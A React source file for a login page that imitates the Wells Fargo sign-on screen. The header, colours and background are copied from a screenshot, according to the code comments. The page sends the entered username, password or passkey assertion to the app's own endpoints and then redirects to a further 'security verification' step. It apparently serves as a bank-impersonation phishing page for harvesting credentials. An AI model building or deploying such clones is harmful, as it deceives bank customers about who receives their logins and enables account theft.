import { useState } from "react";
import { useForm } from "react-hook-form";
import { useMutation } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Search } from "lucide-react";
import { Link, useLocation } from "wouter";
import { OfficialFooter } from "@/components/official-footer";

type LoginFormData = {
  username: string;
  password: string;
};

function getGreeting() {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 17) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [saveUsername, setSaveUsername] = useState(false);
  const [greeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [biometricLoading, setBiometricLoading] = useState(false);
  const [usernameValue, setUsernameValue] = useState("");

  const handleBiometricLogin = async () => {
    setBiometricLoading(true);
    try {
      const challengeRes = await fetch("/api/auth/biometric/challenge", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "authenticate" }),
      });
      if (!challengeRes.ok) throw new Error("Failed to get challenge");
      const { challenge, rpId, allowCredentials } = await challengeRes.json();
      const credential = await navigator.credentials.get({
        publicKey: {
          challenge: Uint8Array.from(atob(challenge), c => c.charCodeAt(0)),
          rpId: rpId || window.location.hostname,
          allowCredentials: allowCredentials?.map((id: string) => ({
            id: Uint8Array.from(atob(id), c => c.charCodeAt(0)),
            type: "public-key" as const,
            transports: ["internal", "hybrid"] as AuthenticatorTransport[],
          })) || [],
          userVerification: "required",
          timeout: 120000,
        },
      }) as PublicKeyCredential;
      if (credential) {
        const authenticatorResponse = credential.response as AuthenticatorAssertionResponse;
        const authData = new Uint8Array(authenticatorResponse.authenticatorData);
        const flags = authData[32];
        const userVerified = (flags & 0x04) !== 0;
        const userPresent = (flags & 0x01) !== 0;
        const authRes = await fetch("/api/auth/biometric/authenticate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            credentialId: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.rawId)))),
            signature: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authenticatorResponse.signature)))),
            authenticatorData: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authenticatorResponse.authenticatorData)))),
            clientDataJSON: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.response.clientDataJSON)))),
            biometricType: "facial_recognition",
            userVerified,
            userPresent,
            credentialType: credential.type,
            authenticatorAttachment: (credential as any).authenticatorAttachment || "platform",
          }),
        });
        if (authRes.ok) {
          const authDataResponse = await authRes.json();
          toast({ title: "Face ID Sign On Successful", description: "Please complete security verification..." });
          sessionStorage.setItem("loginUsername", authDataResponse.user?.id || "biometric_user");
          setLocation("/verify");
        } else {
          throw new Error("Biometric authentication failed");
        }
      }
    } catch (error: any) {
      console.log("Face ID not available or cancelled");
    } finally {
      setBiometricLoading(false);
    }
  };

  const form = useForm<LoginFormData>({ defaultValues: { username: "", password: "" } });

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const response = await apiRequest("POST", "/api/auth/login", { username: data.username, password: data.password });
      const result = await response.json();
      return { ...result, username: data.username };
    },
    onSuccess: (data) => {
      sessionStorage.setItem("loginUsername", data.username);
      toast({ title: "Sign On Successful", description: "Please complete security verification..." });
      setLocation("/verify");
    },
    onError: (error: Error) => {
      toast({ title: "Sign On Failed", description: error.message || "Invalid username or password", variant: "destructive" });
    },
  });

  const onSubmit = (data: LoginFormData) => loginMutation.mutate(data);

  const LoginCard = ({ isDesktop = false }: { isDesktop?: boolean }) => (
    <div
      className="bg-[#f5efe6] rounded-2xl shadow-2xl"
      style={{
        width: isDesktop ? 420 : "100%",
        padding: isDesktop ? "40px 44px" : "28px 18px 40px",
      }}
    >
      <h2
        className="font-normal text-[#111] text-center leading-none mb-7"
        style={{
          fontFamily: "Georgia, 'Times New Roman', serif",
          fontSize: isDesktop ? 34 : 32,
        }}
        data-testid="text-greeting"
      >
        {greeting}
      </h2>

      <form onSubmit={form.handleSubmit(onSubmit)}>
        {/* Username field */}
        <div className="mb-[10px] relative">
          <input
            {...form.register("username", { required: true })}
            placeholder="Username"
            autoComplete="username"
            autoCapitalize="off"
            autoCorrect="off"
            spellCheck={false}
            onChange={(e) => {
              form.setValue("username", e.target.value);
              setUsernameValue(e.target.value);
            }}
            className="w-full text-[16px] text-gray-800 placeholder-gray-400 bg-white rounded-[12px] focus:outline-none"
            style={{
              height: 56,
              padding: "0 44px 0 14px",
              border: "1.5px solid #c8c8c8",
            }}
            data-testid="input-username"
          />
          {usernameValue && (
            <button
              type="button"
              onMouseDown={(e) => e.preventDefault()}
              onClick={() => { form.setValue("username", ""); setUsernameValue(""); }}
              className="absolute right-[12px] top-1/2 -translate-y-1/2"
              data-testid="button-clear-username"
            >
              <svg viewBox="0 0 20 20" width="20" height="20" fill="none">
                <circle cx="10" cy="10" r="9" stroke="#aaa" strokeWidth="1.5" />
                <path d="M7 7l6 6M13 7l-6 6" stroke="#aaa" strokeWidth="1.5" strokeLinecap="round" />
              </svg>
            </button>
          )}
        </div>

        {/* Password field */}
        <div className="mb-[14px] relative">
          <input
            {...form.register("password", { required: true })}
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            autoComplete="current-password"
            className="w-full text-[16px] text-gray-800 placeholder-gray-400 bg-white rounded-[12px] focus:outline-none"
            style={{
              height: 56,
              padding: "0 56px 0 14px",
              border: "1.5px solid #c8c8c8",
            }}
            data-testid="input-password"
          />
          <button
            type="button"
            onMouseDown={(e) => e.preventDefault()}
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-[14px] top-1/2 -translate-y-1/2 text-[#4338ca] text-[15px] font-medium"
            data-testid="button-toggle-password"
          >
            {showPassword ? "Hide" : "Show"}
          </button>
        </div>

        {/* Save username */}
        <div className="flex items-center gap-[10px] mb-[8px]">
          <div
            className="w-[18px] h-[18px] flex-shrink-0 border border-gray-500 flex items-center justify-center cursor-pointer bg-white"
            style={{ borderRadius: 3 }}
            onClick={() => setSaveUsername(!saveUsername)}
            data-testid="checkbox-save-username"
          >
            {saveUsername && (
              <svg viewBox="0 0 12 12" className="w-3 h-3" fill="none">
                <path d="M2 6l3 3 5-5" stroke="#333" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            )}
          </div>
          <label className="text-[15px] text-gray-800 cursor-pointer select-none" onClick={() => setSaveUsername(!saveUsername)}>
            Save username
          </label>
        </div>

        {/* Security text */}
        <p className="text-[12.5px] text-gray-500 leading-[1.45] mb-[28px]">
          To help keep your account secure, save your username only on devices that aren't used by other people.
        </p>

        {/* Sign on button */}
        <div className="flex justify-center mb-[14px]">
          <button
            type="submit"
            disabled={loginMutation.isPending}
            className="rounded-full text-[16px] font-medium transition-colors disabled:opacity-60"
            style={{ height: 50, width: 220, backgroundColor: "#d0d0d0", color: "#888" }}
            data-testid="button-sign-on"
          >
            {loginMutation.isPending ? "Signing on…" : "Sign on"}
          </button>
        </div>
      </form>

      <p className="text-center text-[14px] text-gray-600 mb-[14px]">or</p>

      {/* Passkey button */}
      <div className="flex justify-center mb-[14px]">
        <button
          type="button"
          onClick={handleBiometricLogin}
          disabled={biometricLoading}
          className="rounded-full bg-white text-[15px] font-medium text-gray-900 flex items-center justify-center gap-[7px] hover:bg-gray-50 transition-colors disabled:opacity-60"
          style={{ height: 50, width: 220, border: "1.5px solid #222" }}
          data-testid="button-passkey"
        >
          <svg viewBox="0 0 20 20" width="19" height="19" fill="none" aria-hidden="true">
            <circle cx="8" cy="6" r="3.5" stroke="#333" strokeWidth="1.4" />
            <path d="M1.5 17c0-3.3 2.9-6 6.5-6" stroke="#333" strokeWidth="1.4" strokeLinecap="round" />
            <circle cx="15" cy="13.5" r="2.5" stroke="#333" strokeWidth="1.4" />
            <path d="M17 15l1.5 1.5M18.5 15.5L17 17" stroke="#333" strokeWidth="1.3" strokeLinecap="round" />
            <circle cx="15" cy="13.5" r="0.8" fill="#333" />
          </svg>
          {biometricLoading ? "Authenticating…" : "Use a passkey"}
        </button>
      </div>

      <p className="text-[12.5px] text-gray-600 leading-[1.45] mb-[36px]">
        Don't have one? Create a passkey after signing on and skip the password next time.
      </p>

      <div className="flex items-center justify-center gap-[5px]">
        <span className="text-[#4b3f9e] text-[15px]">→</span>
        <Link href="/forgot-password" className="text-[#4b3f9e] text-[15px] hover:underline" data-testid="link-forgot">
          Forgot username or password?
        </Link>
      </div>
    </div>
  );

  return (
    <>
      {/* ── DESKTOP LAYOUT ── */}
      <div className="hidden lg:flex flex-col min-h-screen">

        {/* Header — dark maroon matching screenshot */}
        <header style={{ backgroundColor: "#3d1010", borderBottom: "1px solid #5a1818", flexShrink: 0 }}>
          <div className="px-6 flex items-center justify-between" style={{ height: 46 }}>
            <div
              className="text-white font-bold tracking-[0.18em]"
              style={{ fontFamily: "'Times New Roman', Georgia, serif", fontSize: 19 }}
            >
              WELLS FARGO
            </div>
            <div className="flex items-center gap-5 text-white" style={{ fontSize: 13 }}>
              <div className="flex items-center gap-1.5 cursor-pointer hover:underline">
                <svg viewBox="0 0 16 16" width="12" height="12" fill="none">
                  <rect x="3" y="7" width="10" height="8" rx="1.5" stroke="white" strokeWidth="1.4" />
                  <path d="M5.5 7V5a2.5 2.5 0 0 1 5 0v2" stroke="white" strokeWidth="1.4" strokeLinecap="round" />
                </svg>
                <Link href="/register" className="text-white hover:underline">Enroll</Link>
              </div>
              <span className="cursor-pointer hover:underline">Customer Service</span>
              <span className="cursor-pointer hover:underline">ATMs/Locations</span>
              <span className="cursor-pointer hover:underline">Español</span>
              {/* Search box */}
              <div className="flex items-center bg-white overflow-hidden" style={{ height: 26, borderRadius: 2 }}>
                <span className="text-gray-500 px-2" style={{ fontSize: 12 }}>Search</span>
                <div
                  className="flex items-center justify-center px-2 h-full cursor-pointer"
                  style={{ backgroundColor: "#6b1a1a" }}
                >
                  <Search className="text-white" style={{ width: 13, height: 13 }} />
                </div>
              </div>
            </div>
          </div>
        </header>

        {/* Full-page background with centered card */}
        <div
          className="flex-1 flex items-center justify-center relative overflow-hidden"
          style={{ minHeight: "calc(100vh - 46px)" }}
        >
          {/* Sky — matches the reddish-purple winter sunset in the screenshot */}
          <div className="absolute inset-0" style={{
            background: `linear-gradient(to bottom,
              #0d0202 0%,
              #1c0505 6%,
              #330a08 12%,
              #58120e 19%,
              #7a1c14 26%,
              #9e2a1c 33%,
              #be3d24 40%,
              #d05228 46%,
              #c84e28 51%,
              #b04028 56%,
              #8c2e20 62%,
              #6a1e14 68%,
              #4a1008 74%,
              #2e0806 80%,
              #180404 86%,
              #0c0202 92%,
              #060101 97%,
              #020000 100%
            )`
          }} />

          {/* Full-screen SVG scene — sky to forest floor */}
          <svg
            className="absolute inset-0"
            viewBox="0 0 1440 900"
            preserveAspectRatio="xMidYMid slice"
            style={{ width: "100%", height: "100%" }}
            xmlns="http://www.w3.org/2000/svg"
          >
            <defs>
              {/* Glow on the horizon (warm orange band) */}
              <radialGradient id="horizonGlow" cx="50%" cy="52%" r="55%" gradientUnits="userSpaceOnUse">
                <stop offset="0%" stopColor="#e06030" stopOpacity="0.45" />
                <stop offset="40%" stopColor="#c04020" stopOpacity="0.2" />
                <stop offset="100%" stopColor="#000000" stopOpacity="0" />
              </radialGradient>
              {/* Deep shadow at bottom */}
              <linearGradient id="groundDark" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%" stopColor="#1a0404" stopOpacity="0.7" />
                <stop offset="100%" stopColor="#030000" stopOpacity="1" />
              </linearGradient>
              {/* Subtle glow behind the card area */}
              <radialGradient id="cardGlow" cx="50%" cy="45%" r="30%">
                <stop offset="0%" stopColor="#d05028" stopOpacity="0.18" />
                <stop offset="100%" stopColor="#000000" stopOpacity="0" />
              </radialGradient>
            </defs>

            {/* Horizon warm glow overlay */}
            <ellipse cx="720" cy="470" rx="900" ry="320" fill="url(#horizonGlow)" />

            {/* Subtle glow centered behind card */}
            <rect x="0" y="0" width="1440" height="900" fill="url(#cardGlow)" />

            {/* ── BACKGROUND tree ridge (distant, mid-tone) ── */}
            <path
              d="M0,750 L0,560
                L18,530 L35,510 L52,525 L68,490 L85,505 L100,472 L118,488 L134,460
                L150,478 L166,448 L183,465 L200,435 L218,452 L235,420 L250,438
                L265,415 L282,432 L298,408 L315,425 L332,400 L348,418 L365,395
                L382,412 L398,388 L415,406 L432,382 L448,400 L464,376 L480,395
                L497,370 L514,388 L530,364 L546,382 L562,358 L578,376 L595,352
                L612,370 L628,346 L644,364 L660,342 L677,360 L694,336 L710,355
                L726,332 L742,350 L758,328 L774,347 L790,324 L806,343 L822,320
                L838,339 L854,316 L870,335 L886,313 L902,332 L918,310 L934,328
                L950,306 L966,325 L982,303 L998,322 L1014,300 L1030,318 L1046,296
                L1062,315 L1078,293 L1094,312 L1110,290 L1126,308 L1142,286
                L1158,305 L1174,283 L1190,302 L1206,280 L1222,298 L1238,276
                L1254,295 L1270,274 L1286,292 L1302,270 L1318,288 L1334,270
                L1350,285 L1366,268 L1382,280 L1398,262 L1414,275 L1430,258 L1440,265
                L1440,750 Z"
              fill="#1a0606"
              opacity="0.9"
            />

            {/* ── MID-GROUND tree ridge (medium distance) ── */}
            <path
              d="M0,750 L0,520
                L15,490 L28,465 L45,480 L58,448 L72,462 L88,432 L102,450
                L115,418 L130,438 L145,405 L160,425 L174,392 L190,415 L204,380
                L218,402 L233,368 L248,392 L262,355 L276,380 L292,343 L308,368
                L322,332 L337,358 L351,320 L365,347 L380,312 L396,340 L410,305
                L424,333 L438,295 L452,325 L468,285 L484,315 L498,278 L512,308
                L527,270 L542,300 L557,262 L572,294 L586,255 L600,288 L615,250
                L630,282 L645,243 L660,276 L674,238 L688,272 L703,234 L718,268
                L733,228 L748,264 L763,222 L778,258 L792,218 L807,252 L822,214
                L837,248 L852,210 L867,245 L882,207 L897,242 L912,204 L927,240
                L942,202 L957,238 L972,200 L987,235 L1002,198 L1017,232 L1032,196
                L1047,230 L1062,194 L1077,228 L1092,192 L1107,226 L1122,190
                L1137,224 L1152,188 L1167,222 L1182,186 L1197,220 L1212,184
                L1227,218 L1242,186 L1257,220 L1272,188 L1287,222 L1302,190
                L1317,225 L1332,193 L1347,228 L1362,198 L1377,235 L1392,210
                L1407,248 L1420,230 L1432,255 L1440,270
                L1440,750 Z"
              fill="#130404"
              opacity="0.92"
            />

            {/* ── FOREGROUND tree ridge (close-up, very dark) ── */}
            <path
              d="M0,750 L0,470
                L12,440 L22,412 L38,430 L52,395 L65,415 L80,378 L95,400
                L108,362 L124,386 L138,345 L155,372 L169,330 L184,360 L198,315
                L212,345 L227,298 L244,330 L258,285 L274,318 L288,270 L302,305
                L318,258 L334,295 L348,242 L362,280 L376,228 L392,268 L408,215
                L422,255 L436,200 L450,242 L465,188 L480,230 L495,175 L510,218
                L525,165 L540,208 L555,158 L570,200 L585,150 L600,193 L615,145
                L630,188 L645,140 L660,184 L675,135 L690,178 L705,130 L720,175
                L735,128 L750,173 L765,125 L780,170 L795,122 L810,168 L825,120
                L840,166 L855,118 L870,164 L885,116 L900,162 L915,115 L930,160
                L945,113 L960,158 L975,112 L990,157 L1005,110 L1020,155 L1035,110
                L1050,155 L1065,108 L1080,154 L1095,108 L1110,153 L1125,107
                L1140,152 L1155,107 L1170,152 L1185,107 L1200,153 L1215,108
                L1230,153 L1245,108 L1260,154 L1275,110 L1290,155 L1305,112
                L1320,158 L1335,115 L1350,162 L1365,120 L1380,168 L1395,132
                L1410,178 L1425,150 L1440,185
                L1440,750 Z"
              fill="#0a0202"
            />

            {/* ── Individual foreground pine trees (highly detailed, very close) ── */}
            {/* Each tree: multiple overlapping tiers, getting wider toward base */}

            {/* Tall pine left */}
            <polygon points="85,750 85,160 95,220 78,230 100,280 72,295 105,340 65,358 112,400 58,420 118,460 50,480 125,520 45,540 128,580 42,600 130,640 40,660 132,700 38,720 134,750" fill="#060101" />

            {/* Medium pine left-center */}
            <polygon points="220,750 220,220 230,275 215,285 238,330 208,345 244,390 202,410 250,450 195,472 258,515 188,535 264,575 184,595 268,630 180,650 272,690 178,710 274,750" fill="#040101" />

            {/* Tall pine center-left */}
            <polygon points="390,750 390,130 402,192 380,205 410,262 372,280 418,338 364,360 426,415 356,438 434,490 348,514 440,560 342,582 446,618 338,640 450,678 334,700 452,750" fill="#060101" />

            {/* Medium pine center */}
            <polygon points="560,750 560,185 570,240 552,252 578,308 544,325 584,380 538,400 590,452 532,475 596,518 526,540 602,578 520,600 606,640 516,662 608,750" fill="#040101" />

            {/* Tall pine center */}
            <polygon points="720,750 720,115 733,180 708,194 740,255 700,275 748,338 692,362 756,422 684,448 764,505 676,530 770,570 670,592 776,630 664,655 780,695 660,718 784,750" fill="#060101" />

            {/* Medium pine center-right */}
            <polygon points="880,750 880,178 892,235 868,248 900,308 860,328 908,385 852,408 916,460 844,484 922,525 838,548 928,585 832,608 932,645 828,668 936,750" fill="#040101" />

            {/* Tall pine right-center */}
            <polygon points="1045,750 1045,135 1058,198 1032,212 1066,275 1024,298 1074,362 1016,388 1082,448 1008,474 1090,532 1000,558 1096,595 994,620 1100,660 990,682 1104,750" fill="#060101" />

            {/* Medium pine right */}
            <polygon points="1215,750 1215,195 1226,248 1204,262 1234,320 1196,340 1242,398 1188,422 1250,478 1180,502 1258,542 1172,566 1264,602 1166,628 1268,668 1162,692 1270,750" fill="#040101" />

            {/* Tall pine far right */}
            <polygon points="1375,750 1375,170 1387,228 1363,242 1394,304 1356,326 1400,388 1350,412 1406,470 1344,495 1410,538 1340,562 1414,598 1336,622 1418,662 1332,686 1420,750" fill="#060101" />

            {/* Ground fill */}
            <rect x="0" y="740" width="1440" height="160" fill="#020000" />

            {/* Soft blend of ground into trees */}
            <rect x="0" y="680" width="1440" height="80" fill="url(#groundDark)" />
          </svg>

          {/* Login card — centered, slightly above center to account for trees */}
          <div className="relative z-10" style={{ marginBottom: 80 }}>
            <LoginCard isDesktop={true} />
          </div>
        </div>
      </div>

      {/* ── MOBILE LAYOUT ── */}
      <div className="lg:hidden min-h-screen flex flex-col bg-white">
        <header className="bg-[#d71e28] flex items-center px-4" style={{ height: 52 }}>
          <div className="flex-1" />
          <span
            className="text-white font-bold text-[17px] tracking-[0.16em]"
            style={{ fontFamily: "'Times New Roman', Georgia, serif" }}
          >
            WELLS FARGO
          </span>
          <div className="flex-1 flex justify-end">
            <button
              type="button"
              aria-label="Menu"
              data-testid="button-mobile-menu"
              className="flex flex-col justify-center gap-[5px] py-2"
            >
              <span className="block w-[22px] h-[2px] bg-white" />
              <span className="block w-[22px] h-[2px] bg-white" />
              <span className="block w-[22px] h-[2px] bg-white" />
            </button>
          </div>
        </header>
        <div className="h-[3px] bg-[#ffcd41]" />
        <main className="flex-1 bg-white overflow-y-auto">
          <div className="px-[18px] pt-7 pb-10">
            <LoginCard isDesktop={false} />
          </div>
        </main>
        <OfficialFooter />
      </div>
    </>
  );
}
